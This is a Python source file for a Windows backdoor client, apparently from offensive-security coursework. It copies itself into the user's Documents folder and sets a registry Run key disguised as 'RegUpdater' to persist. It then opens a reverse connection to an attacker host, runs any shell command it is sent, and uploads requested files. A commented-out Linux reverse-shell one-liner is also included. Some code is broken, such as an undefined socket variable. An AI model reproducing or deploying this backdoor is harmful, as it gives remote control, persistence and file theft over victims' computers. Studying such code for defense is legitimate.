#!/usr/bin/python
import commands
import shutil
import socket
import subprocess
import os
import platform
import sys
import _winreg as wreg
#import requests 
import time
import random  # Needed to generate random

#recon Phase for persistence we are going to copy ourselves to doc folder

path = os.getcwd().strip('/n')  
Null,userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')
destination = userprof.strip('\n\r') + '\\Documents\\'  +'persistantViperClient.py'
#If it was the first time our backdoor gets executed, then Do phase 1 and phase 2 

if not os.path.exists(destination):  

    shutil.copyfile(path+'\persistantViperClient.py', destination)#You can replace   path+'\persistence.exe'  with  sys.argv[0] , the sys.argv[0] will return the file name
                                                         # and we will get the same result
    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",0,
                         wreg.KEY_ALL_ACCESS)
    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ,destination)
    key.Close()



# In the transfer function, we first check if the file exists in the first place, if not we will notify the attacker
# otherwise, we will create a loop where each time we iterate we will read 1 KB of the file and send it, since the
# server has no idea about the end of the file we add a tag called 'DONE' to address this issue, finally we close the file


def transfer(s,path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE')
        f.close()

def recieve(s):
    print('We are receiving a file')
    f = open('C:\\Temp\\test.txt', 'wb')
    while True:
        bits = s.recv(1024)
        print(bits)
        if 'File does not exist' in bits:
            print('File does not exist')
            break
        elif bits.endswith('DONE'):
            print('[+] Tansfer Complete ')
            f.close()
            break
        else:
            f.write(bits)
            print('[+] Tansfer Complete ')
            f.close()
            break



def connect():
	#s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.110.50",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('10.11.0.202', 8081))

#Last phase is to start a reverse connection back to our kali machine

    while True:
        command =  s.recv(1024)

        if 'terminate' in command:
            return 1 # if we got terminate order, then we exit connect function and return a value of 1, this value will be used to end up the whole script



# if we received grab keyword from the attacker, then this is an indicator for
# file transfer operation, hence we will split the received commands into two
# parts, the second part which we interested in contains the file path, so we will
# store it into a variable called path and pass it to transfer function

# Remember the Formula is  grab*<File Path>
# Example:  grab*C:\Users\Ghost\Desktop\photo.jpeg

        elif 'grab' in command:
            grab,path = command.split('*')

            try:                          # when it comes to low level file transfer, allot of things can go wrong, therefore
                                          # we use exception handling (try and except) to protect our script from being crashed
                                          # in case something went wrong, we will send the error that happened and pass the exception
                transfer(s,path)
            except Exception,e:
                s.send ( str(e) )  # send the exception error
                pass


        elif 'cd' in command:# the forumal here is gonna be cd then space then the path that we want to go to, like  cd C:\Users
            code,directory = command.split(" ") # split up the received command based on space into two variables
            os.chdir(directory) # changing the directory
            # we send back a string mentioning the new CWD Note, os.getcwd should stop it from hanging
            s.send( "[+] CWD Is " + os.getcwd() )

        elif 'getenv' in command:
            s.send( "[+] Platform Is " + platform.platform())

        elif 'getuid' in command:
            s.send( "[+] UserID Is " + os.environ.get('USERNAME'))


        else:
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read()  )
            s.send( CMD.stderr.read()  )
        #time.sleep(3)


# Here we start our infinite loop, we try to connect to our kali server, if we got an exception (connection error)
# then we will sleep for a random time between 1 and 10 seconds and we will pass that exception and go back to the 
# infinite loop once again untill we got a sucessful connection.


while True:
    
    try:
        if connect() == 1:
            sock.send("Connection is shutting down ..................\n\n")
            s.close()
            break
        
    except:
        sleep_for = random.randrange(1, 10)
        #time.sleep( sleep_for )        #Sleep for a random time between 1-10 seconds
        time.sleep( sleep_for * 60 )  #Sleep for a random time between 1-10 minutes
        pass

def main ():
    connect()
main()
main()
